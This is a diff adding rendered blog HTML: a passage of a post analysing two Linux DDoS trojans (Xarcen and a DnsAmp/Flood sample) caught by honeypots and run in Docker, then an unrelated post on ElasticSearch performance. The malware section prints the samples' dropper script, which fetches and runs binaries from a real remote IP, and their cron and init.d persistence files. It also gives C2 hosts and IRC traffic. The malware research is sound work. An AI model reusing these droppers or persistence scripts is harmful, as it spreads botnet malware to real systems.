+</pre></td><td class='code'><pre><code class='bash'><span class='line'>/Applications/VirtualBox.app/Contents/MacOS/VBoxManage modifyvm default --nictrace1 on --nictracefile1 /tmp/log.pcap
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<center><small>You may need to stop the docker container for this command to generate pcap files</small></center>
+
+
+<p><br>
+We can exec into the container to check running processes and see other commands being run.</p>
+
+<p>We’ll be using docker to dump a clean image and an infected image, in order to see what files were modified and/or dropped onto the file system:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>docker <span class="nb">export </span>container_id &gt; container.tar
+</span><span class='line'>tar xvf container.tar -C container-dump
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>What you want to do in order to get a clean a dump as possible:</p>
+
+<ul>
+<li>Run a plain ubuntu container <code>docker run -it ubuntu bash</code> to get into it and at the console</li>
+<li>Run any commands you want (like <code>apt-get update</code> or <code>apt-get install wget</code> or whatever other tools you think you will need)</li>
+<li>Save the &ldquo;comparison&rdquo; container using <code>docker export</code> then extract it into a folder</li>
+</ul>
+
+
+<p>Now when running the malware (assuming its in the current directory):</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>docker run -it --volume<span class="o">=</span><span class="sb">`</span><span class="nb">pwd</span><span class="sb">`</span>:/malware:ro ubuntu bash
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Repeat the same commands you ran above in the &ldquo;comparison&rdquo; container (or save it as an image and spawn from that).</p>
+
+<p>Now you can exec into your container and run the malware. Depending on how comfortable you are with monitoring your own network you should be doing this on an isolated network. Now to running the two malware samples we&rsquo;ll be going over today:</p>
+
+<p><a name="trojan"></a></p>
+
+<h2>Trojan-DDoS.Linux.Xarcen.a</h2>
+
+<p><strong>Common name:</strong> HEUR:Trojan-DDoS.Linux.Xarcen.a<br>
+<strong>sha256:</strong> acbccef76341af012bdf8f0022b302c08c72c6911631f98de8d9f694b3460e25<br>
+<strong>md5:</strong> 63f286aa32a4baaa8b0dd137eb4b3361</p>
+
+<p>Initial look:</p>
+
+<ul>
+<li>C&amp;C trojan</li>
+<li>Drops multiple copies of itself</li>
+<li>Will randomly spawn processes and change process names</li>
+</ul>
+
+
+<h4>Process output</h4>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class='text'><span class='line'>root@f702ada96794:/malware# ps ax
+</span><span class='line'>  PID TTY      STAT   TIME COMMAND
+</span><span class='line'>    1 ?        Ss     0:00 bash
+</span><span class='line'>   21 ?        Ssl    0:00 netstat -antop
+</span><span class='line'>   72 ?        Ss     0:00 bash
+</span><span class='line'>   75 ?        Ss     0:00 pwd
+</span><span class='line'>   78 ?        Ss     0:00 route -n
+</span><span class='line'>   80 ?        Ss     0:00 grep &quot;A&quot;
+</span><span class='line'>   81 ?        Ss     0:00 whoami
+</span><span class='line'>   93 ?        Ss     0:00 cat resolv.conf
+</span><span class='line'>   96 ?        Ss     0:00 whoami
+</span><span class='line'>   99 ?        R+     0:00 ps ax
+</span><span class='line'>  100 ?        Ss     0:00 su
+</span><span class='line'>  102 ?        R      0:00 /usr/bin/nnqucjsvsp who 21
+</span><span class='line'>root@f702ada96794:/malware# ps ax
+</span><span class='line'>  PID TTY      STAT   TIME COMMAND
+</span><span class='line'>    1 ?        Ss     0:00 bash
+</span><span class='line'>   21 ?        Ssl    0:00 netstat -antop
+</span><span class='line'>   93 ?        Ss     0:00 cat resolv.conf
+</span><span class='line'>   96 ?        Ss     0:00 whoami
+</span><span class='line'>  100 ?        Ss     0:00 su
+</span><span class='line'>  102 ?        Ss     0:00 who
+</span><span class='line'>  103 ?        Ss     0:00 id
+</span><span class='line'>  104 ?        R+     0:00 ps ax
+</span><span class='line'>root@f702ada96794:/malware# ps ax
+</span><span class='line'>  PID TTY      STAT   TIME COMMAND
+</span><span class='line'>    1 ?        Ss     0:00 bash
+</span><span class='line'>   21 ?        Ssl    0:00 netstat -antop
+</span><span class='line'>   93 ?        Ss     0:00 cat resolv.conf
+</span><span class='line'>   96 ?        Ss     0:00 whoami
+</span><span class='line'>  100 ?        Ss     0:00 su
+</span><span class='line'>  102 ?        Ss     0:00 who
+</span><span class='line'>  103 ?        Ss     0:00 id
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>Network Traffic</h4>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class='text'><span class='line'>Frame 523: 271 bytes on wire (2168 bits), 271 bytes captured (2168 bits)
+</span><span class='line'>Ethernet II, Src: CadmusCo_26:3d:b9 (08:00:27:26:3d:b9), Dst: RealtekU_12:35:02 (52:54:00:12:35:02)
+</span><span class='line'>Internet Protocol Version 4, Src: 10.0.2.15, Dst: 23.234.60.143
+</span><span class='line'>Transmission Control Protocol, Src Port: 39433 (39433), Dst Port: 80 (80), Seq: 1, Ack: 1, Len: 217
+</span><span class='line'>Hypertext Transfer Protocol
+</span><span class='line'>    GET /config.rar HTTP/1.1\r\n
+</span><span class='line'>        [Expert Info (Chat/Sequence): GET /config.rar HTTP/1.1\r\n]
+</span><span class='line'>        Request Method: GET
+</span><span class='line'>        Request URI: /config.rar
+</span><span class='line'>        Request Version: HTTP/1.1
+</span><span class='line'>    Accept: */*\r\n
+</span><span class='line'>    Accept-Language: zh-cn\r\n
+</span><span class='line'>    User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; TencentTraveler ; .NET CLR 1.1.4322)\r\n
+</span><span class='line'>    Host: aa.hostasa.org\r\n
+</span><span class='line'>    Connection: Keep-Alive\r\n
+</span><span class='line'>    \r\n
+</span><span class='line'>    [Full request URI: http://aa.hostasa.org/config.rar]
+</span><span class='line'>    [HTTP request 1/1]
+</span><span class='line'>    [Response in frame: 537]
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>Dropped Files</h4>
+
+<p>2 binaries were dropped onto the file system, which looked to be copies of itself:</p>
+
+<ul>
+<li><strong>g7hs-dump/usr/bin/filupxsndj</strong>
+
+<ul>
+<li>sha256: 3657bd42fef97343c78a199d3611285e6fe7b88cc91e127d17ebbbbb2fd2f292</li>
+<li>Common name: HEUR:Trojan-DDoS.Linux.Xarcen.a</li>
+</ul>
+</li>
+<li><strong>g7hs-dump/lib/libudev.so</strong>
+
+<ul>
+<li>sha256: acbccef76341af012bdf8f0022b302c08c72c6911631f98de8d9f694b3460e25</li>
+<li>Common name: HEUR:Trojan-DDoS.Linux.Xarcen.a</li>
+</ul>
+</li>
+</ul>
+
+
+<p>Several other plain text files were dropped in order to ensure startup:</p>
+
+<p><strong>/etc/cron.hourly/gcc.sh</strong></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/bin/sh</span>
+</span><span class='line'><span class="nv">PATH</span><span class="o">=</span>/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/bin
+</span><span class='line'><span class="k">for</span> i in <span class="sb">`</span>cat /proc/net/dev<span class="p">|</span>grep :<span class="p">|</span>awk -F: <span class="o">{</span><span class="s1">&#39;print $1&#39;</span><span class="o">}</span><span class="sb">`</span><span class="p">;</span> <span class="k">do</span> ifconfig <span class="nv">$i</span> up<span class="p">&amp;</span> <span class="k">done</span>
+</span><span class='line'>cp /lib/libudev.so /lib/libudev.so.6
+</span><span class='line'>/lib/libudev.so.6
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><strong>/etc/crontab</strong></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>*/3 * * * * root /etc/cron.hourly/gcc.sh
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><strong>/etc/init.d/filupxsndj</strong></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/bin/sh</span>
+</span><span class='line'><span class="c"># chkconfig: 12345 90 90</span>
+</span><span class='line'><span class="c"># description: filupxsndj</span>
+</span><span class='line'><span class="c">### BEGIN INIT INFO</span>
+</span><span class='line'><span class="c"># Provides:            filupxsndj</span>
+</span><span class='line'><span class="c"># Required-Start:</span>
+</span><span class='line'><span class="c"># Required-Stop:</span>
+</span><span class='line'><span class="c"># Default-Start:      1 2 3 4 5</span>
+</span><span class='line'><span class="c"># Default-Stop:</span>
+</span><span class='line'><span class="c"># Short-Description:  filupxsndj</span>
+</span><span class='line'><span class="c">### END INIT INFO</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">case</span> <span class="nv">$1</span> in
+</span><span class='line'>start<span class="o">)</span>
+</span><span class='line'>      /usr/bin/filupxsndj
+</span><span class='line'>      <span class="p">;;</span>
+</span><span class='line'>stop<span class="o">)</span>
+</span><span class='line'>      <span class="p">;;</span>
+</span><span class='line'>*<span class="o">)</span>
+</span><span class='line'>      /usr/bin/filupxsndj
+</span><span class='line'>      <span class="p">;;</span>
+</span><span class='line'><span class="k">esac</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><strong>/etc/rc1.d/S90filupxsndj</strong></p>
+
+<p><strong>/etc/init.d/filupxsndj</strong></p>
+
+<p><strong>/etc/rc2.d/S90filupxsndj</strong></p>
+
+<p><strong>/etc/init.d/filupxsndj</strong></p>
+
+<p><strong>/etc/rc3.d/S90filupxsndj</strong></p>
+
+<p><strong>/etc/rc4.d/S90filupxsndj</strong></p>
+
+<p><strong>/etc/init.d/filupxsndj</strong></p>
+
+<p><strong>/etc/rc5.d/S90filupxsndj</strong></p>
+
+<p><strong>/etc/init.d/filupxsndj</strong></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>/etc/init.d/filupxsndj
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><strong>/lib/libudev.so</strong></p>
+
+<p><em>binary</em></p>
+
+<p><strong>/run/gcc.pid</strong></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bfpftcdsdhkveetlovyuysfcaeyrxboz
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>Overview</h4>
+
+<p>So we can see several things going on: dropped files, additional payload downloads, tries to persist itself in as many places as possible, masks its presence with different process names. These two pieces of malware were the first ones I&rsquo;ve analyzed (ever) so I don&rsquo;t have much indepth analysis other than what I was able to gather from network traffic and observations through docker. For a more detailed write up <a href="https://securelist.com/analysis/publications/64361/versatile-ddos-trojan-for-linux/">Kaspersky has a great writeup, including reversed source code</a>.</p>
+
+<p><a name="ddos-flood"></a></p>
+
+<h2>DDOS.Flood / DnsAmp</h2>
+
+<p><strong>Common name:</strong> DDOS.Flood / DnsAmp<br>
+<strong>sha256:</strong> d9d58fb1f562e7c22bb67edf9dc651fa8bc823ff3e8aecc04131c34b5bc8cf03<br>
+<strong>md5:</strong> b589c8a722b5c35d4bd95487b47f8b8b</p>
+
+<p>Initial look:</p>
+
+<ul>
+<li>Initial payload is a shell script</li>
+<li>Another DDOS type malware</li>
+<li>Drops several binaries that cover as many architectures as possible (ARM/MIPS/etc)</li>
+<li>Masks itself as system interrupt process (irq)</li>
+<li>Uses IRC + HTTP for communication</li>
+<li>Connects to 2 IPs:
+
+<ul>
+<li><strong>52.8.123.250:80</strong>
+
+<ul>
+<li>Running on AWS, most likely compromised.</li>
+</ul>
+</li>
+<li><strong>49.231.211.193:8080</strong>
+
+<ul>
+<li>Running somewhere in Australia.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Initial payload is a bash script</li>
+</ul>
+
+
+<h4>Dropped Files</h4>
+
+<p><em>Initial Payload</em></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/bin/bash</span>
+</span><span class='line'>wget -c http://52.8.123.250/x/tty0 -P /var/run <span class="o">&amp;&amp;</span> chmod +x /var/run/tty0 <span class="o">&amp;&amp;</span> /var/run/tty0 <span class="p">&amp;</span>
+</span><span class='line'>wget -c http://52.8.123.250/x/tty1 -P /var/run <span class="o">&amp;&amp;</span> chmod +x /var/run/tty1 <span class="o">&amp;&amp;</span> /var/run/tty1 <span class="p">&amp;</span>
+</span><span class='line'>wget -c http://52.8.123.250/x/tty2 -P /var/run <span class="o">&amp;&amp;</span> chmod +x /var/run/tty2 <span class="o">&amp;&amp;</span> /var/run/tty2 <span class="p">&amp;</span>
+</span><span class='line'>wget -c http://52.8.123.250/x/tty3 -P /var/run <span class="o">&amp;&amp;</span> chmod +x /var/run/tty3 <span class="o">&amp;&amp;</span> /var/run/tty3 <span class="p">&amp;</span>
+</span><span class='line'>wget -c http://52.8.123.250/x/tty4 -P /var/run <span class="o">&amp;&amp;</span> chmod +x /var/run/tty4 <span class="o">&amp;&amp;</span> /var/run/tty4 <span class="p">&amp;</span>
+</span><span class='line'>wget -c http://52.8.123.250/x/tty5 -P /var/run <span class="o">&amp;&amp;</span> chmod +x /var/run/tty5 <span class="o">&amp;&amp;</span> /var/run/tty5 <span class="p">&amp;</span>
+</span><span class='line'>wget -c http://52.8.123.250/x/pty <span class="o">&amp;&amp;</span> chmod +x pty <span class="o">&amp;&amp;</span> ./pty <span class="p">&amp;</span>
+</span><span class='line'>wget -c http://52.8.123.250/x/pty -P /var/run <span class="o">&amp;&amp;</span> chmod +x /var/run/pty <span class="o">&amp;&amp;</span> /var/run/pty <span class="p">&amp;</span>
+</span><span class='line'>rm -rf /var/run/1sh
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><em>/var/spool/cron/crontabs/root</em></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># DO NOT EDIT THIS FILE - edit the master and reinstall.</span>
+</span><span class='line'><span class="c"># (/var/run/.x001804289383 installed on Tue May 17 21:20:29 2016)</span>
+</span><span class='line'><span class="c"># (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)</span>
+</span><span class='line'>* * * * * /run/pty &gt; /dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">&amp;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>Network Traffic</h4>
+
+<p><em>Port 8080</em></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>Frame 4660: <span class="m">556</span> bytes on wire <span class="o">(</span><span class="m">4448</span> bits<span class="o">)</span>, <span class="m">556</span> bytes captured <span class="o">(</span><span class="m">4448</span> bits<span class="o">)</span>
+</span><span class='line'>Ethernet II, Src: RealtekU_12:35:02 <span class="o">(</span>52:54:00:12:35:02<span class="o">)</span>, Dst: CadmusCo_26:3d:b9 <span class="o">(</span>08:00:27:26:3d:b9<span class="o">)</span>
+</span><span class='line'>Internet Protocol Version 4, Src: 211.103.199.98, Dst: 10.0.2.15
+</span><span class='line'>Transmission Control Protocol, Src Port: <span class="m">8080</span> <span class="o">(</span>8080<span class="o">)</span>, Dst Port: <span class="m">46783</span> <span class="o">(</span>46783<span class="o">)</span>, Seq: 17, Ack: 85, Len: 502
+</span><span class='line'>Hypertext Transfer Protocol
+</span><span class='line'>    :IRC!IRC@izu.ko PRIVMSG x86<span class="p">|</span>x<span class="p">|</span>0<span class="p">|</span>344265<span class="p">|</span>a31f446d :<span class="se">\0</span>01VERSION<span class="se">\0</span>01<span class="se">\r\n</span>
+</span><span class='line'>    :izu.ko <span class="m">001</span> x86<span class="p">|</span>x<span class="p">|</span>0<span class="p">|</span>344265<span class="p">|</span>a31f446d :<span class="se">\n</span>
+</span><span class='line'>    :izu.ko <span class="m">002</span> x86<span class="p">|</span>x<span class="p">|</span>0<span class="p">|</span>344265<span class="p">|</span>a31f446d :<span class="se">\n</span>
+</span><span class='line'>    :izu.ko <span class="m">003</span> x86<span class="p">|</span>x<span class="p">|</span>0<span class="p">|</span>344265<span class="p">|</span>a31f446d :<span class="se">\n</span>
+</span><span class='line'>    :izu.ko <span class="m">004</span> x86<span class="p">|</span>x<span class="p">|</span>0<span class="p">|</span>344265<span class="p">|</span>a31f446d :<span class="se">\n</span>
+</span><span class='line'>    :izu.ko <span class="m">005</span> x86<span class="p">|</span>x<span class="p">|</span>0<span class="p">|</span>344265<span class="p">|</span>a31f446d :<span class="se">\n</span>
+</span><span class='line'>    :izu.ko <span class="m">005</span> x86<span class="p">|</span>x<span class="p">|</span>0<span class="p">|</span>344265<span class="p">|</span>a31f446d :<span class="se">\n</span>
+</span><span class='line'>    :izu.ko <span class="m">005</span> x86<span class="p">|</span>x<span class="p">|</span>0<span class="p">|</span>344265<span class="p">|</span>a31f446d :<span class="se">\n</span>
+</span><span class='line'>    :izu.ko <span class="m">375</span> x86<span class="p">|</span>x<span class="p">|</span>0<span class="p">|</span>344265<span class="p">|</span>a31f446d :<span class="se">\n</span>
+</span><span class='line'>    :izu.ko <span class="m">372</span> x86<span class="p">|</span>x<span class="p">|</span>0<span class="p">|</span>344265<span class="p">|</span>a31f446d :- 27/10/2014 11:36<span class="se">\r\n</span>
+</span><span class='line'>    :izu.ko <span class="m">372</span> x86<span class="p">|</span>x<span class="p">|</span>0<span class="p">|</span>344265<span class="p">|</span>a31f446d :- !!<span class="se">\r\n</span>
+</span><span class='line'>    :izu.ko <span class="m">376</span> x86<span class="p">|</span>x<span class="p">|</span>0<span class="p">|</span>344265<span class="p">|</span>a31f446d :<span class="se">\n</span>
+</span><span class='line'>
+</span><span class='line'>Frame 4665: <span class="m">257</span> bytes on wire <span class="o">(</span><span class="m">2056</span> bits<span class="o">)</span>, <span class="m">257</span> bytes captured <span class="o">(</span><span class="m">2056</span> bits<span class="o">)</span>
+</span><span class='line'>Ethernet II, Src: RealtekU_12:35:02 <span class="o">(</span>52:54:00:12:35:02<span class="o">)</span>, Dst: CadmusCo_26:3d:b9 <span class="o">(</span>08:00:27:26:3d:b9<span class="o">)</span>
+</span><span class='line'>Internet Protocol Version 4, Src: 211.103.199.98, Dst: 10.0.2.15
+</span><span class='line'>Transmission Control Protocol, Src Port: <span class="m">8080</span> <span class="o">(</span>8080<span class="o">)</span>, Dst Port: <span class="m">46783</span> <span class="o">(</span>46783<span class="o">)</span>, Seq: 519, Ack: 393, Len: 203
+</span><span class='line'>Hypertext Transfer Protocol
+</span><span class='line'>    :x86<span class="p">|</span>x<span class="p">|</span>0<span class="p">|</span>344265<span class="p">|</span>a31f446d!x00@96.228.244.140 JOIN :#x86<span class="se">\r\n</span>
+</span><span class='line'>    :izu.ko <span class="m">332</span> x86<span class="p">|</span>x<span class="p">|</span>0<span class="p">|</span>344265<span class="p">|</span>a31f446d <span class="c">#x86 :https://www.youtube.com/watch?v=dDp3lfE_In8\r\n</span>
+</span><span class='line'>    :izu.ko <span class="m">333</span> x86<span class="p">|</span>x<span class="p">|</span>0<span class="p">|</span>344265<span class="p">|</span>a31f446d <span class="c">#x86 Jorgee 1463456542\r\n</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>Overview</h4>
+
+<p>I can see several things happening here, the most interesting I think is the multiple architecture support - perhaps trying to compromise routers and other smaller IoT devices that are running ARM or other mobile processors. It tries to mask itself as a pty process and then installs itself in crontab. Finally it does some communication over IRC in plain text. Based on the limited network communication I saw, I&rsquo;m guessing this might belong to a Spanish hacker group (from the youtube link) - or it might just be a coincidence of what I saw while executing the malware.</p>
+
+<h2>Building the Honeypot Network</h2>
+
+<p>Finding cheap hosts is important, we don&rsquo;t care about a lot of the niceties we&rsquo;d normally want in a VPS provider or cloud provider (like DO or AWS) - what we want is a cheap isolated environment to run our honeypots in (either cheaper kvm/xen, or even cheaper openvz). To that end, serverbear.com is great for simple price comparison shopping.</p>
+
+<p>I currently am still trying to find the best locations and providers to use but have a mix of OpenVZ and KVM instances running. The main OS is Ubuntu, however any flavor of linux will do since the go binary will be compatible on any of them.</p>
+
+<p>And finally, in order to get the best representation of activity, it&rsquo;s best to spread the servers out globally so you can get a wide geographic coverage (Europe, America, Asia, etc).</p>
+
+<h2>Future plans</h2>
+
+<ul>
+<li>Payload downloading
+
+<ul>
+<li>Download the payloads as they get &lsquo;executed&rsquo; on the honeypot</li>
+</ul>
+</li>
+<li>Automate analysis
+
+<ul>
+<li>Automate using docker and other tools to produce reliable analysis output</li>
+</ul>
+</li>
+<li>More honeypots
+
+<ul>
+<li>Right now I&rsquo;m only running 6 - each is about $2-5/month</li>
+</ul>
+</li>
+<li>Automate WHOIS lookups
+
+<ul>
+<li>Automate abuse complaint sends and track which providers are actually monitoring and care about what their networ is used for</li>
+</ul>
+</li>
+<li>More services
+
+<ul>
+<li>Expand honeypot protocols to FTP, HTTP Proxies (Polipo, Squid, etc), etc</li>
+</ul>
+</li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2015/11/understanding-elasticsearch-performance/">Understanding ElasticSearch Performance</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-11-26T12:05:13-05:00" pubdate data-updated="true">Nov 26<sup>th</sup>, 2015</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><center><em>Performance before and after Optimizations</em></center>
+
+
+<p><img src="/images/worker_stats.png" alt="" /></p>
+
+<p>When working with billions of documents in your Elasticsearch cluster, there are a few important things to keep in mind:</p>
+
+<ul>
+<li>Look at what the big players do (Elasticsearch/Kibana) for organization and planning</li>
+<li>Experiment with index sizes that make sense for your business, don&rsquo;t just assume 1 index for a billion documents is a good idea (even if you N shards)</li>
+<li>Understand which metrics to monitor when you are performance testing your cluster</li>
+<li>Monitor all points of ingestion: Elasticsearch, Load balancers (ELB, HAProxy, etc), and your application code that is inserting</li>
+</ul>
+
+
+<h3>What do the big players do?</h3>
+
+<p>Split by date ranges. Based on your data, decide whether daily, weekly, or even monthly splits are best for your dataset.
+<a href="https://www.elastic.co/guide/en/elasticsearch/guide/current/_limiting_memory_usage.html">Elasticsearch reccomends not going over 30-32G per shard based on current JVM memory reccomendations</a>.
+The reason they reccomend to stay below 32G of ram per shard is that after that, the JVM will use uncompressed pointers which means internal pointers go from 4 bytes to 8 bytes, which (depending on your memory size) can lead to decreased
+heap available and also increased GC times from the JVM.</p>
+
+<p>Don&rsquo;t allocate more than 50% of your system memory for the JVM. Your kernel will cache files and help keep performance up.
+Over-allocating the JVM can lead to poor performance from the underlying engine, Lucene,
+which relies on the OS cache as well as the JVM to do searches.</p>
+
+<p>Understand your users: other devs, other systems, etc. Don&rsquo;t do <a href="https://www.elastic.co/guide/en/elasticsearch/guide/current/pagination.html">deep pagination</a>
+instead, use <a href="https://www.elastic.co/guide/en/elasticsearch/guide/current/scan-scroll.html">scan and scroll</a>.
+Turn on slow logging to find any queries doing this or returning to many points of data per query.</p>
+
+<h3>Index Sizing and Memory</h3>
+
+<p>Keeping in mind the 30-32G per shard reccomendation, this will determine the number of shards per dataset.
+Remember shards are not modifiable but replicas are. Shards will increase indexing performance, while replicas will increase search performance.</p>
+
+<p>Overwhelmed and can&rsquo;t figure out what to do? Just start with an index and see how things go.
+Using alias&rsquo;s you can create another index later on and map both of them together for searching (and eventually delete the old one if the data expires).
+If you start out with alias&rsquo;s being used, transitions can be seemless (no need to redeploy to point to the new alias/index name).</p>
+
+<h3>Metrics to monitor</h3>
+
+<p>Use the plugin community to monitor your cluster: <a href="http://www.elastichq.org/">ElasticHQ</a>,
+<a href="http://bigdesk.org/">BigDesk</a>, <a href="https://github.com/mobz/elasticsearch-head">Head</a>
+and <a href="https://github.com/karmi/elasticsearch-paramedic">Paramedic</a>.</p>
+
+<p>Watch for refresh/merge/flush time (ElasticHQ makes this available under Node Diagnostics).
+For example, with a large index (1TB) that has frequent updates or deletions,
+in order for the data to actually be freed from the disk and cluster fully, a merge must be performed.
+When the number of segments in a cluster gets to large, this can cause issues
+for refreshing and merging.</p>
+
+<p>The basic idea is the larger your index, the more segments, and the
+more optimization steps that need to be performed. Automatic flushes happen every
+few seconds so more segments get created - as you can imagine this gets compounded the
+larger your index is.
+<a href="https://www.elastic.co/guide/en/elasticsearch/guide/current/merge-process.html">You can see a full rundown of how deleting and updating works in the documentation</a>.</p>
+
+<p>By seperating our indexes into smaller datasets (by day, week, or month) we can eliminate some of the issues that pop up.
+For example, a large number of segments can cause search performance issues
+until an optmize command is run (which in itself can cause high IO and make your search unavailable).
+By reducing the data we reduce the time these operations can take. We also end up at
+a point where no new data is inserted into the old indexes, so no further
+optimizations need to be done on them, only new indexes.
+Any acitivity on the old indexes then should only be from searching and will
+reduce the IO requirements from the cluster for those shards/indexes.</p>
+
+<p>This also greatly simplifies purging old data. Instead of having to have the
+cluster do merges and optimizations when we remove old documents, we can
+just delete the old indexes and remove them from the aliases. This will also
+reduce the IO overhead on your cluster.</p>
+
+<h3>Monitoring Ingestion</h3>
+
+<p>Watch your ELB response time - is it spiking? Check flush, merge, and indexing times.</p>
+
+<p>Add logging to your posts to understand how long each bulk insert is taking. Play with bulk sizes to see what works best for your document/datasize.</p>
+
